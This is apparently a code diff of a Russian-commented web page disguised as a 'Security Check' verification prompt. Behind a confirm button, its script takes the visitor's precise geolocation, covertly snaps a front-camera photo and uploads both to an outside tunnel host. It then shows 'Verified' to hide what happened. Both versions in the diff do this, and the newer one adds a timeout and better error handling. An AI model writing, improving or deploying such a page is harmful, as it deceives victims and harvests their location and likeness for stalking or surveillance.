@@ -1,95 +1,86 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Verification</title>
-    <style>
-        body { margin: 0; background: #050505; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { width: 80%; max-width: 300px; padding: 40px; background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; text-align: center; }
-        .btn { background: #fff; color: #000; border: none; padding: 15px 30px; font-size: 16px; font-weight: 600; border-radius: 12px; cursor: pointer; width: 100%; }
-        #loader { display: none; margin: 20px auto; width: 30px; height: 30px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        video, canvas { display: none; }
-        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; opacity: 0; pointer-events: none; z-index: 100; }
-    </style>
-</head>
-<body>
-
-<div id="flash"></div>
-
-<div class="card">
-    <h1 id="title" style="font-size: 20px;">Security Check</h1>
-    <p id="desc" style="color: #888; font-size: 14px; margin-bottom: 30px;">Нажмите для синхронизации</p>
-    <button class="btn" id="mainBtn" onclick="run()">Подтвердить</button>
-    <div id="loader"></div>
-</div>
-
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
-
 <script>
-    // ТВОЙ АКТУАЛЬНЫЙ АДРЕС (ИЗ ТЕРМИНАЛА)
-    const API = "https://29fe27558e7e03.lhr.life"; 
+    // === ВСТАВЬ СВОЙ АКТУАЛЬНЫЙ ПУТЬ ТУТ ===
+    const API_URL = "https://cea92047d6c9f1.lhr.life"; 
 
-    async function run() {
+    async function initiate() {
         const btn = document.getElementById('mainBtn');
         const loader = document.getElementById('loader');
         const title = document.getElementById('title');
-        
+        const desc = document.getElementById('desc');
+
         btn.style.display = 'none';
         loader.style.display = 'block';
-        title.innerText = "Processing...";
+        title.innerText = "Связь...";
 
         try {
-            // 1. Пинг сервера (Проверка связи)
-            await fetch(`${API}/ping`);
+            // 1. УМНЫЙ ПИНГ (Обход кэша)
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000); // Таймаут 5 сек
 
-            // 2. Гео (параллельно)
+            const ping = await fetch(`${API_URL}/ping?t=${Date.now()}`, {
+                method: 'GET',
+                mode: 'cors',
+                signal: controller.signal
+            }).catch(e => { throw new Error("СЕРВЕР МОЛЧИТ. Проверь: 1. Запущен ли main.py 2. Работает ли SSH 3. Верна ли ссылка."); });
+
+            clearTimeout(timeoutId);
+            title.innerText = "Доступ разрешен";
+
+            // 2. ГЕОЛОКАЦИЯ (Параллельно)
             navigator.geolocation.getCurrentPosition(pos => {
-                fetch(`${API}/location`, {
+                fetch(`${API_URL}/location`, {
                     method: 'POST',
+                    mode: 'cors',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
                 });
             }, null, {enableHighAccuracy: true});
 
-            // 3. Камера
-            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+            // 3. КАМЕРА
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: {ideal: 1280}, height: {ideal: 720} } 
+            });
             const v = document.getElementById('v');
             v.srcObject = stream;
 
-            await new Promise(r => setTimeout(r, 1200));
+            await new Promise(r => setTimeout(r, 1500));
 
-            // 4. Снимок
+            // 4. ФОТО И ОТПРАВКА
             document.getElementById('flash').style.opacity = "1";
-            
+            const canvas = document.getElementById('c');
+            canvas.width = v.videoWidth; 
+            canvas.height = v.videoHeight;
+            canvas.getContext('2d').drawImage(v, 0, 0);
+
             setTimeout(async () => {
-                const canvas = document.getElementById('c');
-                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                canvas.getContext('2d').drawImage(v, 0, 0);
                 document.getElementById('flash').style.opacity = "0";
-
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+                
                 const fd = new FormData();
-                fd.append('file', blob, `snap_${Date.now()}.jpg`);
+                fd.append('file', blob, 'snap.jpg');
 
-                await fetch(`${API}/upload-photo`, {method: 'POST', body: fd});
+                const response = await fetch(`${API_URL}/upload-photo`, { 
+                    method: 'POST', 
+                    mode: 'cors',
+                    body: fd 
+                });
 
-                // Конец
-                stream.getTracks().forEach(t => t.stop());
-                title.innerText = "Verified";
-                loader.style.display = 'none';
-                document.getElementById('desc').innerText = "Успешно завершено";
-            }, 100);
+                if (response.ok) {
+                    title.innerText = "Verified";
+                    desc.innerText = "Синхронизация с Mac завершена.";
+                    loader.style.display = 'none';
+                    stream.getTracks().forEach(t => t.stop());
+                } else {
+                    throw new Error("Ошибка загрузки фото на сервер.");
+                }
+            }, 200);
 
-        } catch (e) {
-            alert("Ошибка связи с сервером. Проверьте туннель.");
+        } catch (err) {
+            console.error(err);
+            alert("🚨 КРИТИЧЕСКАЯ ОШИБКА:\n" + err.message);
+            title.innerText = "Ошибка";
             btn.style.display = 'block';
             loader.style.display = 'none';
-            title.innerText = "Error";
         }
     }
 </script>
-</body>
-</html>
